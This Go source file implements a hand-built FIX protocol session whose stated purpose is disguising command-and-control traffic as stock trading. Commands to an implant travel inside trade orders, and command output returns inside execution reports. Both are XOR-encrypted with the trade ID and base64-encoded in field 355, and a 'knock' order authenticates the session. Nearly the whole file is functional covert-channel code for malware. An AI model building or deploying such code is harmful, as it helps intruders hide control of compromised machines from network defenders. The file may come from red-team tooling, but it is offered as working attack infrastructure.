//Implements some basic FIX protocol functionality for disguising C2 exchange as stock trading
//I should have built this with a library but I was too stubborn so we have this abomination instead
package fix

import (
    "bufio"
    "encoding/base64"
    "errors"
    "fmt"
    "io"
    "math/rand/v2"
    "net"
    "strconv"
    "strings"
    "time"
)


//Holds FIX session config info
type Config struct {
    BeginString   string //FIX version banner. ex: "FIX.4.4"
    SenderCompID  string //sender ID (tag 49)
    TargetCompID  string //target ID (tag 56)
    //Heartbeat     int    //seconds between idle heartbeats (tag 108)
    seq           int    //sequence number
}

//FIX session wrapper
type Session struct {
    cfg      Config
    conn     net.Conn
    reader   *bufio.Reader
}

//Holds fields for a message
type Message struct {
    msgType  string
    fields   map[string]string
    header   string
    body     string
    trailer  string
    payload  []byte
    checksum int
}

//Returns a wrapper for a FIX session
func New(conn net.Conn, cfg Config) *Session {
    s := &Session{cfg: cfg, conn: conn, reader: bufio.NewReader(conn)}
    s.cfg.seq = 0
    /*if s.cfg.HeartBtInt > 0 {
      go s.heartbeatLoop()
    }*/
    return s
}

//Closes a FIX session by sending a logout message
func (s *Session) Close() error {
    if err := s.Logout(); err != nil {
        return err
    }
    return nil
}

//Send logon message and await confirmation
func (s *Session) Logon() error {
    if err := s.SendLogon(); err != nil {
        return err
    }
    if _, err := s.awaitMsg("A"); err != nil {
        return err
    }
    return nil
}

//Send basic logon message
func (s *Session) SendLogon() error {
    logonMsg := buildLogon(s.cfg)
    if err := s.sendMsg(logonMsg); err != nil {
        return err
    }
    return nil
}

//Awaits logon from trade cleint and sends confirmation logon
func (s *Session) AcceptLogon() error {
    _, err := s.awaitMsg("A")
    if err != nil {
        return err
    }
    if err := s.SendLogon(); err != nil {
        return err
    }
    return nil
}

//Sends logout message
func (s* Session) Logout() error {
    logoutMsg := buildLogout(s.cfg)
    if err := s.sendMsg(logoutMsg); err != nil {
        return err
    }
    return nil
}

//Checks if order "knock" is valid
func (s *Session) CheckKnock(symbol string, qty int) (bool, error) {
    msg, err := s.awaitMsg("D")
    if err != nil {
        return false, err
    }
    if msg.fields["55"] == symbol && msg.fields["38"] == strconv.Itoa(qty) {
        return true, nil
    }
    return false, nil
}

//Sends basic market order with payload
func (s *Session) SendTradeOrder(symbol string, qty int, payload []byte) error {
    msg := buildTradeOrder(s.cfg, symbol, qty, payload)
    if err := s.sendMsg(msg); err != nil {
        return err
    }
    return nil
}

//Awaits trade order with embedded C2 command, extracts payload, and returns command string / order ID
func (s *Session) RecvTradeOrder() ([]byte, string, error) {
    msg, err := s.awaitMsg("D")
    if err != nil {
        return nil, "", err
    }
    payload, err := msg.extractPayload()
    if err != nil {
        return nil, "", err
    }
    return payload, msg.fields["11"], nil
}

//Send basic execution report with embedded payload
func (s *Session) SendExecReport(ordID string, symbol string, qty int, payload []byte) error {
    msg := buildExecReport(s.cfg, ordID, symbol, qty, payload)
    if err := s.sendMsg(msg); err != nil {
        return err
    }
    return nil
}

//Awaits execution report with embedded C2 command output, extracts payload, and returns output bytes
func (s *Session) RecvExecReport() ([]byte, error) {
    msg, err := s.awaitMsg("8")
    if err != nil {
        return nil, err
    }
    payload, err := msg.extractPayload()
    if err != nil {
        return nil, err
    }
    return payload, nil
}

//Fills header values for a message (body needs to be populated first)
func (msg *Message) fillHeader(cfg Config) {
    //Populate header fields
    msg.fields["8"] = cfg.BeginString                                   //BeginString
    msg.fields["35"] = msg.msgType                                      //MsgType
    msg.fields["49"] = cfg.SenderCompID                                 //SenderCompID
    msg.fields["56"] = cfg.TargetCompID                                 //TargetCompID
    msg.fields["34"] = strconv.Itoa(cfg.seq)                            //MsgSeqNum
    msg.fields["52"] = time.Now().UTC().Format("20060102-15:04:05.000") //SendingTime

    //Break up header into parts here since the "body" length is calculated using the following header values
    msg.header = formatField(8, msg.fields["8"])
    header2 := formatField(35, msg.fields["35"])
    header2 += formatField(49, msg.fields["49"])
    header2 += formatField(56, msg.fields["56"])
    header2 += formatField(34, msg.fields["34"])
    header2 += formatField(52, msg.fields["52"])

    //Now we can calculate body length and append secondary header string to full message header
    msg.fields["9"] = strconv.Itoa(len(header2) + len(msg.body))
    msg.header += formatField(9, msg.fields["9"])
    msg.header += header2
}

//Fills trailer values for a message (header and body need to be populated first)
func (msg *Message) fillTrailer() {
    checksum := checksum([]byte(msg.header + msg.body))
    msg.fields["10"] = strconv.Itoa(checksum)
    msg.trailer = formatField(10, msg.fields["10"])
}

//Routine for encoding/encrypting payloads
//You can make this whatever you want, but this uses the order/report ID (depending on which side you're on) as a basic XOR key (so this function can be used for both encrypting and decrypting)
func crypt(payload []byte, key string) []byte {
    if len(key) == 0 {
        return payload
    }
    keyBytes := []byte(key)
    crypted := make([]byte, len(payload))
    for i := 0; i < len(payload); i++ {
        crypted[i] = payload[i] ^ keyBytes[i%len(keyBytes)]
    }
    return crypted
    //return payload
}

//Inserts C2 data payload in a FIX message depending on message type (assumes other body fields are already filled)
func (msg *Message) insertPayload(payload []byte) {
    //Switch for customizing based on message type if needed
    switch msg.msgType {
    case "A": //Logon (not putting any payloads in login for now)
    case "D": //Trade order (commands to implant from C2 server)
        encryptedPayload := crypt(payload, msg.fields["11"])
        encodedPayload := base64.StdEncoding.EncodeToString(encryptedPayload)
        msg.fields["355"] = encodedPayload
        msg.fields["354"] = strconv.Itoa(len(encodedPayload))
        msg.body += formatField(354, msg.fields["354"])
        msg.body += formatField(355, msg.fields["355"])
    case "8": //Execution report (command output back from implant)
        encryptedPayload := crypt(payload, msg.fields["17"])
        encodedPayload := base64.StdEncoding.EncodeToString(encryptedPayload)
        msg.fields["355"] = encodedPayload
        msg.fields["354"] = strconv.Itoa(len(encodedPayload))
        msg.body += formatField(354, msg.fields["354"])
        msg.body += formatField(355, msg.fields["355"])
    }
}

//Extracts C2 data payload from freshly parsed FIX message
func (msg *Message) extractPayload() ([]byte, error) {
    //Switch for customizing based on message type if needed
    switch msg.msgType {
    case "A": //Logon
    case "D": //Trade order
        decodedPayload, err := base64.StdEncoding.DecodeString(msg.fields["355"])
        if err != nil {
            return nil, err
        }
        decryptedPayload := crypt(decodedPayload, msg.fields["11"])
        return decryptedPayload, nil
    case "8": //Execution report
        decodedPayload, err := base64.StdEncoding.DecodeString(msg.fields["355"])
        if err != nil {
            return nil, err
        }
        decryptedPayload := crypt(decodedPayload, msg.fields["17"])
        return decryptedPayload, nil
    }
    return nil, nil
}

//Returns a random trade ID for orders and execution reports (also used as payload en/decrypt key)
func newTradeID() string {
    return fmt.Sprintf("ORD-%s-%03d", time.Now().UTC().Format("20060102"), rand.IntN(10000000))
}

//Fills fields for a minimal logon message body based on a config
func buildLogon(cfg Config) *Message {
    //Make Logon stub
    msg := &Message{msgType: "A", fields: make(map[string]string), header: "", body: "", trailer: "", checksum: 0}
    //Populate logon-specific fields
    msg.fields["98"] = "0" //EncryptMethod
    //msg.fields["108"] = strconv.Itoa(cfg.Heartbeat)
    //Build body string
    msg.body += formatField(98, msg.fields["98"])
    //Insert payload (if using one)
    //msg.insertPayload(payload)
    //Populate header now that body is filled
    msg.fillHeader(cfg)
    //Populate trailer (checksum) now that header and body are filled
    msg.fillTrailer()
    //msg.printMsg()
    return msg
}

func buildLogout(cfg Config) *Message {
    msg := &Message{msgType: "5", fields: make(map[string]string), header: "", body: "", trailer: "", checksum: 0}
    msg.fillHeader(cfg)
    msg.fillTrailer()
    return msg
}

//Builds a trade order with defaults (symbol/quantity supplied by caller)
func buildTradeOrder(cfg Config, symbol string, qty int, payload []byte) *Message {
    msg := &Message{msgType: "D", fields: make(map[string]string), header: "", body: "", trailer: "", checksum: 0}
    msg.fields["11"] = newTradeID()                                     //ClOrdID
    msg.fields["21"] = "1"                                              //HandlInst
    msg.fields["55"] = symbol                                           //Symbol
    msg.fields["54"] = "1"                                              //Side
    msg.fields["38"] = strconv.Itoa(qty)                                //OrdQty
    msg.fields["60"] = time.Now().UTC().Format("20060102-15:04:05.000") //TransactTime
    msg.fields["40"] = "1"                                              //OrdType
    msg.body += formatField(11, msg.fields["11"])
    msg.body += formatField(21, msg.fields["21"])
    msg.body += formatField(55, msg.fields["55"])
    msg.body += formatField(54, msg.fields["54"])
    msg.body += formatField(38, msg.fields["38"])
    msg.body += formatField(60, msg.fields["60"])
    msg.body += formatField(40, msg.fields["40"])
    msg.insertPayload(payload)
    msg.fillHeader(cfg)
    msg.fillTrailer()
    return msg
}

//Builds an execution report with defaults
func buildExecReport(cfg Config, ordID string, symbol string, qty int, payload []byte) *Message {
    msg := &Message{msgType: "8", fields: make(map[string]string), header: "", body: "", trailer: "", checksum: 0}
    msg.fields["37"] = ordID        //OrderID (assuming this would be the trade order ID but idk)
    msg.fields["17"] = newTradeID() //ExecID
    //msg.fields["150"] = "1"         //ExecType
    msg.fields["39"] = "2"          //OrdStatus
    msg.fields["55"] = symbol       //Symbol
    msg.fields["54"] = "1"          //Side
    msg.fields["151"] = "0"         //LeavesQty
    msg.fields["14"] = "0"          //CumQty
    //msg.fields["6"] = "100"       //AvgPx (this is generally required but I'm leaving it out for now)
    msg.body += formatField(37, msg.fields["37"])
    msg.body += formatField(17, msg.fields["17"])
    //msg.body += formatField(150, msg.fields["150"])
    msg.body += formatField(39, msg.fields["39"])
    msg.body += formatField(55, msg.fields["55"])
    msg.body += formatField(54, msg.fields["54"])
    msg.body += formatField(151, msg.fields["151"])
    msg.body += formatField(14, msg.fields["14"])
    msg.insertPayload(payload)
    msg.fillHeader(cfg)
    msg.fillTrailer()
    return msg
}

//Converts a filled out message object into a byte array representing the message
func (msg *Message) makeBytes() []byte {
    msgBytes := []byte(msg.header + msg.body + msg.trailer)
    return msgBytes
}

//Computes a checksum for a FIX message
func checksum(b []byte) int {
    sum := 0
    for _, c := range b {
        sum += int(c)
    }
    return sum % 256
}

//Returns a "tag=value" field string with trailing SOH delimiter
func formatField(tag int, val string) string {
    return strconv.Itoa(tag) + "=" + val + "\x01"
}

//Sends a built FIX message
func (s *Session) sendMsg(msg *Message) error {
    //msg.printMsg()
    if msg.fields["10"] == "" {
        return errors.New("Error sending fix message: no checksum")
    }
    msgBytes := msg.makeBytes()
    _, err := s.conn.Write(msgBytes)
    if err != nil {
        return err
    }
    s.cfg.seq++
    return nil
}

//Reads a single FIX field from the session buffer
func (s *Session) readField() (string, error) {
    field, err := s.reader.ReadString(0x01)
    if err != nil {
        return "", err
    }
    return strings.TrimSuffix(field, "\x01"), nil
}

//Reads/parses a FIX message from the session buffer
func (s *Session) readMsg() (Message, error) {
    beginString, err := s.readField()
    if err != nil {
        return Message{}, err
    }
    if !strings.HasPrefix(beginString, "8=") {
        return Message{}, errors.New("Error parsing FIX: malformed begin string")
    }
    bodyLenStr, err := s.readField()
    if err != nil {
        return Message{}, err
    }
    if !strings.HasPrefix(bodyLenStr, "9=") {
        return Message{}, errors.New("Error parsing FIX: missing body length")
    }
    bodyLen, err := strconv.Atoi(bodyLenStr[2:])
    if err != nil || bodyLen < 0 {
        return Message{}, errors.New("Error parsing FIX: invalid body length")
    }
    body := make([]byte, bodyLen)
    if _, err := io.ReadFull(s.reader, body); err != nil {
        return Message{}, err
    }
    checkStr, err := s.readField()
    if err != nil {
        return Message{}, err
    }
    if !strings.HasPrefix(checkStr, "10=") {
        return Message{}, errors.New("Error parsing FIX: missing checksum")
    }
    check, err := strconv.Atoi(checkStr[3:])
    if err != nil {
        return Message{}, err
    }

    //Extract bytes for checksum
    msgBytes := make([]byte, 0, len(beginString)+len(bodyLenStr)+len(body)+2)
    msgBytes = append(msgBytes, beginString...)
    msgBytes = append(msgBytes, "\x01"...)
    msgBytes = append(msgBytes, bodyLenStr...)
    msgBytes = append(msgBytes, "\x01"...)
    msgBytes = append(msgBytes, body...)
    if checksum(msgBytes) != check {
        return Message{}, errors.New("Error parsing FIX: checksum mismatch")
    }
    msg := Message{fields: map[string]string{}}
    if len(body) > 0 {
        for _, field := range strings.Split(string(body), "\x01") {
            if field == "" {
                continue
            }
            i := strings.IndexByte(field, '=')
            if i < 1 {
                continue
            }
            msg.fields[field[:i]] = field[i+1:]
        }
    }
    msg.msgType = msg.fields["35"]
    if msg.msgType == "" {
        return Message{}, errors.New("Error parsing FIX: missing message type")
    }
    s.cfg.seq++
    return msg, nil
}

//Waits for a specific message type
func (s *Session) awaitMsg(msgType string) (Message, error) {
    for {
        msg, err := s.readMsg()
        if err != nil {
            return Message{}, err
        }
        switch msg.msgType {
        case msgType:
            return msg, nil
        case "0": //Heartbeat
            continue
        case "5":
            return Message{}, errors.New("Logout received.")
        default:
            continue
        }
    }
}

//Prints message bytes for debugging
func (msg *Message) printMsg() {
    msgBytes := msg.makeBytes()
    fmt.Printf("%q\n", msgBytes)
    fmt.Printf("% x\n", msgBytes)
}
